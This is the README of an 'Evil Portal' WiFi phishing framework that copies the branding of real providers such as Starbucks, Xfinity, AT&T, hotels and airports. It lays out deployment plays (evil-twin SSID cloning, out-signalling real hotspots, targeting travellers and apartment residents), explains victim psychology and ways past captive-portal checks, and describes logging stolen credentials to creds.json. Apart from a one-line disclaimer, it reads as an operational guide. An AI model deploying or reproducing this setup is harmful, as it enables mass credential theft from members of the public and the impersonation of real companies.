# Evil Portal Framework v2 — Universal Edition

Adaptive captive portal that detects and mimics real network providers. Built for authorized red team operations and WiFi security testing.

## Why "Universal"?

Instead of a generic "Guest WiFi" page that screams fake, this framework:
- **Auto-detects the target SSID** and switches branding (Starbucks, Xfinity, hotel, airport, etc.)
- **Uses real colors, logos, and language** from actual providers
- **Adapts form fields** (room number for hotels, email for ISPs)
- **Passes device captive portal checks** for iOS, Android, Windows, macOS

## Built-in Profiles

| Profile | Trigger SSID Keywords | Form Style |
|---------|----------------------|------------|
| `starbucks` | starbucks, sbux | Email + password |
| `xfinity` | xfinity, xfi | Xfinity login |
| `att` | attwifi, at&t | AT&T credentials |
| `spectrum` | spectrum, twc | Spectrum login |
| `hotel` | hotel, hilton, marriott | Room number + last name |
| `airport` | airport, fly, terminal | Email + password |
| `default` | (fallback) | Generic network login |

## Real-World Deployment Scenarios

### 1. Evil Twin (Most Effective)
```bash
# Use aircrack-ng or hostapd to clone a real network
# Example: clone "Starbucks WiFi"
./captive_portal.sh wlan0 192.168.1.1 starbucks
```
**Why it works:** Victims see the same SSID they always connect to. Their device auto-connects (if they've saved it). The captive portal pops up automatically — looks identical to the real one.

### 2. Open Hotspot with Stronger Signal
```bash
# Create "XfinityWiFi" in an area where Xfinity exists
./captive_portal.sh wlan0 192.168.1.1 xfinity
```
**Why it works:** Devices prioritize stronger signal. If your signal beats the real one, they connect to you first. The portal appears "legitimate" because Xfinity actually uses captive portals.

### 3. Hotel/Airport Social Engineering
```bash
# Deploy in hotel lobby or airport terminal
./captive_portal.sh wlan0 192.168.1.1 hotel
```
**Why it works:** Travelers expect captive portals. They're tired, rushed, and already trained to enter credentials on hotel WiFi. The "room number + last name" form feels authentic.

### 4. ISP Spoofing in Residential Areas
```bash
# Broadcast "xfinitywifi" or "ATT-WiFi" in apartment complex
./captive_portal.sh wlan0 192.168.1.1 xfinity
```
**Why it works:** Millions of Xfinity/AT&T customers have accounts. The portal asks for their *actual* ISP credentials — which they use for billing, email, and other services.

## How You'd Fall For It (Self-Test Checklist)

If you were the target, would you catch this? Check yourself:

| Test | Would You Notice? |
|------|-------------------|
| Same SSID as usual | Most people don't check BSSID/MAC |
| Auto-popup on iOS/Android | Looks identical to real captive portal |
| HTTPS warning | Most users tap "Continue" without reading |
| Slight URL mismatch | `192.168.1.1` instead of real domain — who checks? |
| Asking for email/password | You've entered this 100 times before |
| "Connected successfully" page | Buys time before victim realizes |

**The psychology:** People are conditioned to treat captive portals as annoying but harmless. They're trained by *actual* hotels, airports, and coffee shops to enter credentials without thinking. Your portal just needs to not look worse than the real thing.

## Quick Start

```bash
# Install
pip install flask

# Run with specific profile
sudo python3 portal.py --profile starbucks

# Or full deployment with routing
sudo ./captive_portal.sh wlan0 192.168.1.1 starbucks
```

## Files

- `portal.py` — Flask engine with profile switching
- `templates/index.html` — Adaptive login page
- `templates/success.html` — Fake confirmation
- `static/style.css` — Responsive + dark mode
- `static/portal.js` — Fingerprinting + UX
- `captive_portal.sh` — Auto-setup for Pineapple/Linux

## Output

- `creds.json` — Harvested credentials with metadata
- `access.log` — Full access logs

## Legal

For authorized security testing only. Obtain written permission before deployment.
